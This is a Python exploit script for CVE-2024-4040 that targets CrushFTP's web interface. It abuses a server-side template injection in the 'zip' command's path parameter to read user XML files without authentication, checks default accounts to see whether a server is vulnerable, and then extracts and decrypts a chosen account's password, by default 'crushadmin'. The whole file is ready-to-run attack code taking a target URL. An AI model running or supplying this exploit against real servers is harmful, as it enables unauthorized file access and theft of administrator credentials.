import requests
import argparse
import re
import urllib3
import subprocess

urllib3.disable_warnings((urllib3.exceptions.InsecureRequestWarning))
headers = {}

def banner():
    banner = r'''
  / __\ \ / / __|_|_  )  \_  ) | | ___| | | /  \| | | /  \ 
 | (__ \ V /| _|___/ / () / /|_  _|___|_  _| () |_  _| () |
  \___| \_/ |___| /___\__/___| |_|      |_| \__/  |_| \__/ 
'''
    
    return banner

def decryptPassword(url, account, cookies):
    data = {
        "command": "zip",
        "path": "<INCLUDE>users/MainUsers/{}/user.XML</INCLUDE>".format(account),
        "c2f": cookies['currentAuth'],
        "names":"/a"
    }

    response = requests.post(url + "/WebInterface/function/", data=data, cookies=cookies, headers=headers)
    password = re.search(r"<password>(.*?)</password>", response.text).group(1)
    result = subprocess.run("javac decrypt.java && java decrypt '{}'".format(password), shell=True, capture_output=True, text=True)

    if result.returncode == 0:
        return result.stdout

def scan(url, account):
    loginUrl = url + "/WebInterface/login.html"
    
    response = requests.post(loginUrl, headers=headers)
    cookies = response.cookies

    print ("[+] Checking if the target is vulnerable..")

    default_users = ["<INCLUDE>users/MainUsers/TempAccount/user.XML</INCLUDE>", "<INCLUDE>users/MainUsers/default/user.XML</INCLUDE>", "<INCLUDE>users/MainUsers/test/user.XML</INCLUDE>", "<INCLUDE>users/MainUsers/crushadmin/user.XML</INCLUDE>"]
    for default_user in default_users:
        data = {
            "command": "zip",
            "path": default_user,
            "c2f": cookies['currentAuth'],
            "names":"/a"
        }

        response = requests.post(url + "/WebInterface/function/", data=data, cookies=cookies, headers=headers)

        if "<userfile" in response.text: 
            print("[+] Target is Vulnerable!")
            break
        
    else:
        print("[-] Target is not vulnerable!")

    password = decryptPassword(url, account, cookies)
    print("[+] Password is:", password)

def main():
    def parse_headers(headers_string):
        headers_dict = {}
        headers = headers_string.split('\n')

        for header in headers:
            if ':' in header:
                key, value = header.split(':', 1)
                headers_dict[key.strip()] = value.strip()

        return headers_dict
    
    parser = argparse.ArgumentParser(description="CVE-2024-4040")
    parser.add_argument("-u", '--url', required=True, help="The target URL")
    parser.add_argument("-H", "--headers", required=False, help="Headers", type=str)
    parser.add_argument("--account", required=False, help="The target account", default="crushadmin")
    args = parser.parse_args()

    global headers
    if args.headers:
        headers = parse_headers(args.headers)

    print(banner())
    scan(args.url, args.account)
        
if __name__ == "__main__":
    main()